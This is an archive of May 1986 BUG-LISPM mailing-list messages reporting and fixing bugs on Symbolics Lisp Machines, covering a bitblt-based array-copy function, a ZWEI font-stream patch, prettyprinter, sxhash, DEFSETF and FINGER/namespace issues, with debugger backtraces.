FEP 127, FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Killington:

It would seem that the system, and numerous applications, would benefit
from (microcode) support for fast array copying.  I put together the
following function to try to use bitblt when possible:

;; copy a portion of an array fast (faster than copy-array-portion)
;; from-start thru (+ from-start length -1) must be in (linearized) bounds of from-array
;; to-start thru (+ to-start length -1) must be in (linearized) bounds of to-array

(defun fast-array-copy (from-array from-start to-array to-start length)
  (let* ((len 0)
	 (from-type (sys:array-type-field from-array))
	 (from-bits (array-bits-per-element from-type))
	 (to-type (sys:array-type-field to-array)))
    ;; break even point is about 100 bytes
    (if (and (> length 100)
	     (not (null from-bits))
	     (eq from-bits (array-bits-per-element to-type)))
	(let* ((mask (- (array-elements-per-q from-type)))
	       (from-len (logand (array-active-length from-array) mask))
	       (to-len (logand (array-active-length to-array) mask)))
	  (setq len (min length (- from-len from-start) (- to-len to-start)))
	  (if (plusp len)
	      (sys:with-data-stack
		(bitblt tv:alu-seta len 1
			(sys:make-stack-array `(,from-len 1)
					      :type (array-types from-type)
					      :displaced-to from-array)
			from-start 0
			(sys:make-stack-array `(,to-len 1)
					      :type (array-types to-type)
					      :displaced-to to-array)
			to-start 0)))))
    (if (< len length)
	(let* ((from from-array)
	       (to to-array))
	  (declare (compiler:array-register-1d from to))
	  (loop for i from (+ from-start len) below (+ from-start length)
		for j from (+ to-start len)
		do (sys:%1d-aset (sys:%1d-aref from i) to j))))))

For large regions, this is considerably faster than copy-array-portion
(3x for 512 bytes, 5x for 1K bytes, 35x for 64K bytes).  As an example
of what such speed could buy you, I changed tcp::maybe-combine-segs to
call this function instead of copy-array-portion.  In one application
(shipping text from a VAX to the lispm for display via the X Window System
protocol), this cut the network overhead from around 20% down to around
5-10%, thus speeding up text display by 10 to 15%.

Seems worth it to me ...
 1-May-86 15:56:44-EDT,1022;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 May 86 15:56-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 35456; 1 May 86 15:56:38-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 14035; Thu 1-May-86 15:52:09 EDT
Date: Thu, 1 May 86 15:50 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: faster array copying
To: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860501115320.1.RWS@KILLINGTON.LCS.MIT.EDU>
Message-ID: <860501155059.1.DCP@FIREBIRD.SCRC.Symbolics.COM>

We have something on the drawing board called SYS:VECTOR-BITBLT that
does pretty much what your function does, but takes args more like
bitblt so you can not only do fast move (tv:alu-seta) but also all
boolean operations.  There are plans to have copy-array-portion call
this under the right circumstances.  This may find its way into Release
7.

 1-May-86 17:02:36-EDT,5591;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 May 86 17:02-EDT
Received: from RIEMANN.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 30685; Thu 1-May-86 17:02:54-EDT
Date: Thu, 1 May 86 17:02 EDT
From: Nayel El-Shafei <Shafei@OZ.AI.MIT.EDU>
Subject: font shifts in with-editor-stream
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860501170222.2.SHAFEI@RIEMANN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.7, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Georg Friedrich Bernhard Riemann:


hi there,
	i'm getting an error for extra arguments that i didn't type when i try to create a file with different fonts. nobody here
were able to help. any suggestions?

for inspecting the code, look at the function write-file-header in pig:<shafei.qq>latthack.lsp   Evaluating the function reproduces
the error.
i think the problem is how to force the stream editor to infer the epsilons  as font shifts, rather than typing them like any
other character.
								nayel


>>Trap: The function (:METHOD ZWEI:INTERVAL-WITH-FONTS-STREAM :STRING-OUT) was called with too many arguments.
While in the function (:METHOD ZWEI:INTERVAL-WITH-FONTS-STREAM :STRING-OUT)  FORMAT:FORMAT-CTL-STRING  FORMAT

(:METHOD ZWEI:INTERVAL-WITH-FONTS-STREAM :STRING-OUT):  (P.C. = 0)
   Arg 0 (SELF): #<INTERVAL-WITH-FONTS-STREAM 30556452>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:INTERVAL-WITH-FONTS-STREAM -- 8. IV's, 0. FL's 120405621>
   Arg 2 (SI:OPERATION): :STRING-OUT
   Local 2 (SI:OPERATION): #<DTP-EVEN-PC 10542>
   Arg 3 (STRING): ";;; -*- Syntax: Zetalisp; Base: 10; Fonts: CPTFONT,CPTFONTI,CPTFONTB,ARABIC,ARABICB; Package: HOTEP -*-


;                             << M-yirlA NmirlA T-llA M-sb >>

; Nayel S. el-Shafei                                             Yefa-plA NydlA I#c Lyan
; MIT AI Lab                          aygwlwnktll Stswptasam d-hem - Yeano-c#A eakulA Lmem
; *AUTODECL*.LSP                                                       : G-manrblA NAwne
; !!!                          NrmlA F-crlab Tql-et-mlA @#ailA ra-hpA : T------nm XrjlA
; Last revised: %%%                                 1406 B-gR Nm ItaflA  :Lydet r-^A &yrat

; ====================================================================================


;;; This program is created and updated completely by HOTEP system."
   Local 3 (STRING): NIL
   --Extraneous args:--
   Arg 4: 0
   Arg 5: NIL

FORMAT:FORMAT-CTL-STRING:  (P.C. = 50)
   Arg 0 (ARGS): NIL
   Arg 1: ";;; -*- Syntax: Zetalisp; Base: 10; Fonts: CPTFONT,CPTFONTI,CPTFONTB,ARABIC,ARABICB; Package: HOTEP -*-


;                             << M-yirlA NmirlA T-llA M-sb >>

; Nayel S. el-Shafei                                             Yefa-plA NydlA I#c Lyan
; MIT AI Lab                          aygwlwnktll Stswptasam d-hem - Yeano-c#A eakulA Lmem
; *AUTODECL*.LSP                                                       : G-manrblA NAwne
; !!!                          NrmlA F-crlab Tql-et-mlA @#ailA ra-hpA : T------nm XrjlA
; Last revised: %%%                                 1406 B-gR Nm ItaflA  :Lydet r-^A &yrat

; ====================================================================================


;;; This program is created and updated completely by HOTEP system."

FORMAT:  (P.C. = 66)
   Arg 0 (FORMAT:STREAM): #<INTERVAL-WITH-FONTS-STREAM 30556452>
   Arg 1: ";;; -*- Syntax: Zetalisp; Base: 10; Fonts: CPTFONT,CPTFONTI,CPTFONTB,ARABIC,ARABICB; Package: HOTEP -*-


;                             << M-yirlA NmirlA T-llA M-sb >>

; Nayel S. el-Shafei                                             Yefa-plA NydlA I#c Lyan
; MIT AI Lab                          aygwlwnktll Stswptasam d-hem - Yeano-c#A eakulA Lmem
; *AUTODECL*.LSP                                                       : G-manrblA NAwne
; !!!                          NrmlA F-crlab Tql-et-mlA @#ailA ra-hpA : T------nm XrjlA
; Last revised: %%%                                 1406 B-gR Nm ItaflA  :Lydet r-^A &yrat

; ====================================================================================


;;; This program is created and updated completely by HOTEP system."
   Rest arg (ARGS): NIL

WRITE-FILE-HEADING:  (P.C. = 36)  (from PIG:USRD$:[SHAFEI.QQ]LATTHACK)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (WRITE-FILE-HEADING)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:BREAK-INTERNAL 1):  (P.C. = 4)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (NIL)
   Arg 1 (SI:FORM): (WRITE-FILE-HEADING)

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 43440265>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 43440272>

Rest of stack:
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:BREAK-INTERNAL:  (P.C. = 212)
ZWEI:COM-BREAK:  (P.C. = 65)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
 1-May-86 18:06:17-EDT,830;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 May 86 18:06-EDT
Received: from VAIL.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 35480; Thu 1-May-86 18:06:46-EDT
Date: Thu, 1 May 86 18:05 EDT
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: font shifts in with-editor-stream
To: Shafei@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860501170222.2.SHAFEI@RIEMANN.AI.MIT.EDU>
Message-ID: <860501180548.1.CWH@VAIL.LCS.MIT.EDU>

I think this patch will fix your problem.  I haven't tested it, however.

ZWEI:
(DEFMETHOD (INTERVAL-WITH-FONTS-STREAM :STRING-OUT) (STRING &OPTIONAL (BEGIN 0) END)
  (LET ((STRING STRING))
    (DECLARE (SYS:ARRAY-REGISTER STRING))
    (LOOP FOR I FROM BEGIN BELOW (OR END (STRING-LENGTH STRING))
	  DO (SEND SELF :TYO (AREF STRING I)))))
 2-May-86 00:20:19-EDT,555;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 May 86 00:20-EDT
Received: from RIEMANN.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 30714; Fri 2-May-86 00:20:54-EDT
Date: Fri, 2 May 86 00:20 EDT
From: Nayel El-Shafei <Shafei@OZ.AI.MIT.EDU>
Subject: font shifts in with-editor-stream
To: CWH@MIT-ZERMATT.ARPA, Shafei@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860501180548.1.CWH@VAIL.LCS.MIT.EDU>
Message-ID: <860502002013.5.SHAFEI@RIEMANN.AI.MIT.EDU>

Hi;

	Thanx a lot Carl, it worked.

				nayel
 2-May-86 10:44:36-EDT,1229;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 2 May 86 10:41-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 35554; 2 May 86 10:38:06-EDT
Received: from REDWING.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 14292; Fri 2-May-86 08:40:24 EDT
Date: Fri, 2 May 86 08:39 EDT
From: Benson I. Margulies <Margulies@SCRC-YUKON.ARPA>
Subject: faster array copying
To: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>,
    Robert Scheifler <RWS@MIT-ZERMATT.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860501155059.1.DCP@FIREBIRD.SCRC.Symbolics.COM>
Message-ID: <860502083954.4.MARGULIES@REDWING.SCRC.Symbolics.COM>

    Date: Thu, 1 May 86 15:50 EDT
    From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>

    We have something on the drawing board called SYS:VECTOR-BITBLT that
    does pretty much what your function does, but takes args more like
    bitblt so you can not only do fast move (tv:alu-seta) but also all
    boolean operations.  There are plans to have copy-array-portion call
    this under the right circumstances.  This may find its way into Release
    7.


surprise. It already did.

 7-May-86 22:13:48-EDT,937;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 May 86 22:12-EDT
Received: from LIVE-OAK.LCS.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 7 MAY 86  21:52:46 EDT
Received: from ROCKY-GRAZIANO.LCS.MIT.EDU by MIT-LIVE-OAK.ARPA via CHAOS with CHAOS-MAIL id 1141; Wed 7-May-86 21:50:54-EDT
Date: Wed, 7 May 86 21:50 EDT
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: ubiquitous prettyprinter bug
To: bug-lisp@MIT-MC.ARPA, bug-lispm@MIT-MC.ARPA
cc: t-bugs@YALE.ARPA
Message-ID: <860507215037.2.JAR@ROCKY-GRAZIANO.LCS.MIT.EDU>


[User input is in lower case, system output is in upper case]

(defun foo (@x) `(a , @x b))
FOO
(foo 'z)
(A Z B)
(grindef foo)
(DEFUN FOO (@X)
  `(A ,@X B))


The pretty printer generates incorrect output for backquote forms
containing ,<var> where <var> is a variable whose name begins with the
character @.  A bug easily sympathized with, but a bug nonetheless.

- Jonathan
10-May-86 00:19:39-EDT,1240;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 May 86 00:19-EDT
Received: from MIT-LIVE-OAK.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 36247; Sat 10-May-86 00:20:16-EDT
Received: from ROCKY-GRAZIANO.LCS.MIT.EDU by MIT-LIVE-OAK.ARPA via CHAOS with CHAOS-MAIL id 1243; Sat 10-May-86 00:19:23-EDT
Date: Sat, 10 May 86 00:19 EDT
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: (sxhash #\a) => error
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860510001900.1.JAR@ROCKY-GRAZIANO.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13,
microcode TMC5-IO4-ST506-MIC 336, on Lisp Machine Rocky Graziano:

In a Common Lisp Listener, evaluating "(sxhash #\a)" causes the following:

>>Trap: The argument given to the ZETALISP-SYSTEM:%FIXNUM instruction, #\a, was not a single-precision floating-point number.
While in the function SXHASH  SI:*EVAL  (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0)

SXHASH:  (P.C. = 242)
   Arg 0 (SI:X): #\a
   Local 1: #\a
   Local 2 (SI:HASH): #<DTP-EVEN-PC 47561400>
   Local 3 (SI:Y): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SXHASH #\a)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

...
12-May-86 09:57:40-EDT,1763;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 May 86 09:56-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 36396; 12 May 86 09:57:14-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 17842; Mon 12-May-86 09:52:18 EDT
Date: Mon, 12 May 86 09:50 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: (sxhash #\a) => error
To: Jonathan A Rees <JAR@MIT-MC.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860510001900.1.JAR@ROCKY-GRAZIANO.LCS.MIT.EDU>
Message-ID: <860512095055.4.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Sat, 10 May 86 00:19 EDT
    From: Jonathan A Rees <JAR@MIT-MC.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13,
    microcode TMC5-IO4-ST506-MIC 336, on Lisp Machine Rocky Graziano:

    In a Common Lisp Listener, evaluating "(sxhash #\a)" causes the following:

Somebody else at MIT tripped across this a week ago.  SXHASH should be
calling %POINTER on the character object instead of %FIXNUM.  I sent
source code last week.  Maybe somebody at MIT should put this in local
MIT patches?

    >>Trap: The argument given to the ZETALISP-SYSTEM:%FIXNUM instruction, #\a, was not a single-precision floating-point number.
    While in the function SXHASH  SI:*EVAL  (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0)

    SXHASH:  (P.C. = 242)
       Arg 0 (SI:X): #\a
       Local 1: #\a
       Local 2 (SI:HASH): #<DTP-EVEN-PC 47561400>
       Local 3 (SI:Y): NIL

    SI:*EVAL:  (P.C. = 401)
       Arg 0 (SI:FORM): (SXHASH #\a)
       Local 0 (SI:FORM): NIL
       --Defaulted args:--
       Arg 1 (SI:ENV): NIL
       Arg 2 (SI:HOOK): NIL

    ...

12-May-86 18:46:42-EDT,1013;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 May 86 18:46-EDT
Received: from GAUSS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 31912; Mon 12-May-86 18:47:37-EDT
Date: Mon, 12 May 86 18:46 EDT
From: Steven J. Gordon <SJG@OZ.AI.MIT.EDU>
Subject: GAUSS TERMINAL CONNECTION FLAKEY.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860512184648.1.SJG@GAUSS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 14.8, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-debug.flod(10), FEP0:>v127-loaders.flod(5),
FEP0:>v127-info.flod(2), on Lisp Machine Karl Friedrich Gauss:
Warm booted from: Lisp Listener 1.

PAUL,
   Gauss's terminal seems to get disconnected every so often. If I frob
with the connector on the back of the screen (the one which leads to the
rest of the machine), it will usually get reconnected. Also, the reverse
video looks horrible. -- Steve (SJG@OZ)
13-May-86 17:19:12-EDT,1327;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 May 86 17:13-EDT
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 32036; Tue 13-May-86 17:04:33-EDT
Date: Tue, 13 May 86 17:03 EDT
From: Chris Lindblad <CJL@MIT-REAGAN.ARPA>
Subject: namespace via TCP?
To: RWS@MIT-ZERMATT.ARPA
cc: cjl@MIT-REAGAN.ARPA, Hornig@SCRC-STONY-BROOK.ARPA,
    Joseph@SCRC-STONY-BROOK.ARPA, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <860513101939.2.RWS@KILLINGTON.LCS.MIT.EDU>
Message-ID: <860513170340.8.CJL@OTIS.AI.MIT.EDU>

    Date: Tue, 13 May 86 10:19 EDT
    From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>

    I have someone who is interested in putting together a namespace editor
    for Unix using TCP.  Is all that is needed on the lispm side to make
    this happen is to add a (tcp:add-tcp-port-for-protocol :namespace N)
    somewhere?  Has a value for N already been assigned in Release 7?

A udp port for :namespace-timestamp will be necessary as well. I do not
know whether this will be sufficient. I asked about this about 6 months
ago, and was never given a clear answer whether this had been done for
release 7 or not. If Symbolics has not acquired port numbers for
namespace and namespace-timestamp yet, then we might as well do it
ourselves, and see if it works.
13-May-86 18:40:32-EDT,1844;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 May 86 18:40-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 32055; 13 May 86 18:41:34-EDT
Received: from REDWING.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 18837; Tue 13-May-86 18:36:45 EDT
Date: Tue, 13 May 86 18:36 EDT
From: Benson I. Margulies <Margulies@SCRC-YUKON.ARPA>
Subject: namespace via TCP?
To: Chris Lindblad <CJL@MIT-REAGAN.ARPA>, RWS@MIT-ZERMATT.ARPA
cc: Hornig@SCRC-STONY-BROOK.ARPA, Joseph@SCRC-STONY-BROOK.ARPA,
    bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <860513170340.8.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860513183600.8.MARGULIES@REDWING.SCRC.Symbolics.COM>

    Date: Tue, 13 May 86 17:03 EDT
    From: Chris Lindblad <CJL@MIT-REAGAN.ARPA>

	Date: Tue, 13 May 86 10:19 EDT
	From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>

	I have someone who is interested in putting together a namespace editor
	for Unix using TCP.  Is all that is needed on the lispm side to make
	this happen is to add a (tcp:add-tcp-port-for-protocol :namespace N)
	somewhere?  Has a value for N already been assigned in Release 7?

    A udp port for :namespace-timestamp will be necessary as well. I do not
    know whether this will be sufficient. I asked about this about 6 months
    ago, and was never given a clear answer whether this had been done for
    release 7 or not. If Symbolics has not acquired port numbers for
    namespace and namespace-timestamp yet, then we might as well do it
    ourselves, and see if it works.

Make sure that the namespace system does not depend on the specific
CHAOS medium as opposed to generic BYTE-STREAM/DATAGRAM.

We are having some trouble getting TCP ports, as my recent mail to
TCP-IP should suggest.

14-May-86 10:07:08-EDT,1072;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 May 86 10:07-EDT
Date: Wed 14 May 86 10:04:28-EDT
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Extraneous DEFSETF compiler warning.
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12206626945.26.KT@XX.LCS.MIT.EDU>

While using Common Lisp in Release 6.1:

If I have a file with the following in it:

(defun foo ...)

(defsetf foo ...)

and I compile the file on a machine that does not yet have the file loaded
(a freshly booted machine, for example), I get the following compiler warning:

For DEFSETF FOO
  DEFSETF of FOO may be a typographical error since FOO does not currently
  have a function definition.

It seems that the compiler is issuing this message because it can't find
a definition for FOO in the world, whereas what it ought to do is see if FOO
is either in the world or is one of the functions defined during the current
compilation, in the manner of whatever issues the "The following functions
were referenced but don't seem defined" warning.

				--- Ken
-------
14-May-86 11:20:59-EDT,1680;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 May 86 11:20-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 32116; 14 May 86 11:19:50-EDT
Received: from HOME.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 19060; Wed 14-May-86 11:14:57 EDT
Date: Wed, 14 May 86 11:16 EDT
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: Extraneous DEFSETF compiler warning.
To: Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12206626945.26.KT@XX.LCS.MIT.EDU>
Message-ID: <860514111627.1.HORNIG@HOME.SCRC.Symbolics.COM>

    Date: Wed 14 May 86 10:04:28-EDT
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    While using Common Lisp in Release 6.1:

    If I have a file with the following in it:

    (defun foo ...)

    (defsetf foo ...)

    and I compile the file on a machine that does not yet have the file loaded
    (a freshly booted machine, for example), I get the following compiler warning:

    For DEFSETF FOO
      DEFSETF of FOO may be a typographical error since FOO does not currently
      have a function definition.

    It seems that the compiler is issuing this message because it can't find
    a definition for FOO in the world, whereas what it ought to do is see if FOO
    is either in the world or is one of the functions defined during the current
    compilation, in the manner of whatever issues the "The following functions
    were referenced but don't seem defined" warning.

				    --- Ken
    -------
Thank you for your report.  The problem you describe is fixed in release
7.0.

15-May-86 22:06:48-EDT,11392;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 May 86 22:06-EDT
Received: from LENNON.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 32337; Thu 15-May-86 22:08:08-EDT
Date: Thu, 15 May 86 22:07 EDT
From: Randy Parker <PARKER@MIT-REAGAN.ARPA>
Sender: SAUND@OZ.AI.MIT.EDU
Subject: FINGER bug 
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860515220742.1.SAUND@LENNON.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 14.8, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-loaders.flod(5), FEP0:>v127-debug.flod(10),
FEP0:>v127-info.flod(5), on Lisp Machine John Lennon:

From machine AP8, I did a (NETI:FINGER NIL TERMINAL-IO :USER "LENNON" :HOST (SI:PARSE-HOST "LENNON")),
since this is what our CP command FINGER calls.
This caused AP8 to hang.  Entering the debugger in the NAME server process on LENNON showed the below.

Note the frame (:DEFUN-METHOD NETI:LISPM-NAMESPACE-NAMES-ONLY-QUERY-RESPONSE):  (P.C. = 126)  below,
and know that its fourth arg was several hundred long as it (apparently) tried to query
the namespace server for everything but the kitchen sink.

(AISITE: This bug originally came forth in the CP FINGER command here
 as even c-m-ABORT on AP8 didn't stop the other machine from continuing to
 soak cycles up connecting to the namespace server.)

>>Break: 
While in the function PROCESS-WAIT  CHAOS:GET-NEXT-PKT  (:METHOD CHAOS:BASIC-INPUT-STREAM :GET-NEXT-INPUT-PKT)

PROCESS-WAIT:  (P.C. = 1)
   Arg 0 (SI:WHOSTATE): "Chaos In"
   Local 0 (SI:WHOSTATE): #<TYPEOUT-WINDOW Typeout Window 1 43265656 exposed>
   Arg 1 (FUNCTION): #<DTP-COMPILED-FUNCTION (:INTERNAL CHAOS:GET-NEXT-PKT 0) 11555230>
   Local 1 (FUNCTION): #<DTP-LOCATIVE 44661002>
   Rest arg (SI:ARGUMENTS): (#<CHAOS Connection for FINGER to AI|OZ 145132602> #<DTP-LOCATIVE 40151635>)
   Local 2 (SI:ARGUMENTS): #<DTP-LOCATIVE 36141116>

CHAOS:GET-NEXT-PKT:  (P.C. = 174)
   Arg 0 (CHAOS:CONN): #<CHAOS Connection for FINGER to AI|OZ 145132602>
   Arg 1 (CHAOS:NO-HANG-P): NIL
   Arg 2 (CHAOS:STREAM): #<CHARACTER-STREAM 40151631>

(:METHOD CHAOS:BASIC-INPUT-STREAM :GET-NEXT-INPUT-PKT):  (P.C. = 60)
   Arg 0 (SELF): #<CHARACTER-STREAM 40151631>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor CHAOS:BASIC-INPUT-STREAM -- 2. IV's, 0. FL's 121164732>
   Arg 2 (SI:OPERATION): :GET-NEXT-INPUT-PKT
   Arg 3 (CHAOS:NO-HANG-P): NIL

(:METHOD CHAOS:CHARACTER-INPUT-STREAM-MIXIN :NEXT-INPUT-BUFFER):  (P.C. = 6)
   Arg 0 (SELF): #<CHARACTER-STREAM 40151631>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor CHAOS:CHARACTER-INPUT-STREAM-MIXIN -- 1. IV's, 0. FL's 121166445>
   Arg 2 (SI:OPERATION): :NEXT-INPUT-BUFFER
   Arg 3 (CHAOS:NO-HANG-P): NIL

(:METHOD SI:BASIC-BUFFERED-INPUT-STREAM :SETUP-NEXT-INPUT-BUFFER):  (P.C. = 12)
   Arg 0 (SELF): #<CHARACTER-STREAM 40151631>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-BUFFERED-INPUT-STREAM -- 3. IV's, 0. FL's 121164665>
   Arg 2 (SI:OPERATION): :SETUP-NEXT-INPUT-BUFFER
   Arg 3 (SI:NO-HANG-P): NIL
   Arg 4 (SI:EOF): NIL

(:METHOD CHAOS:CHARACTER-STREAM :COMBINED :SETUP-NEXT-INPUT-BUFFER):  (P.C. = 11)
   Arg 0 (SELF): #<CHARACTER-STREAM 40151631>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor CHAOS:CHARACTER-STREAM -- 3. IV's, 9. FL's 121164673>
   Arg 2 (SI:.OPERATION.): :SETUP-NEXT-INPUT-BUFFER
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (NIL NIL)

(:METHOD SI:BUFFERED-LINE-INPUT-MIXIN :STRING-LINE-IN):  (P.C. = 31)
   Arg 0 (SELF): #<CHARACTER-STREAM 40151631>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BUFFERED-LINE-INPUT-MIXIN -- 3. IV's, 0. FL's 121166471>
   Arg 2 (SI:OPERATION): :STRING-LINE-IN
   Arg 3 (SI:EOF): NIL
   Arg 4 (SI:LINE): "LOGIN-NAME rosco OSCARose/"IT-VAXAXroadway, Camb./"02146/"n!\/"/"ve, "
   --Defaulted args:--
   Arg 5 (SI:START): 0
   Arg 6 (SI:END): 64

NETI:PARSE-RECORD-AS-TOKENS:  (P.C. = 34)
   Arg 0 (NETI:STREAM): #<CHARACTER-STREAM 40151631>
   Arg 1 (NETI:COMMENTS-P): T

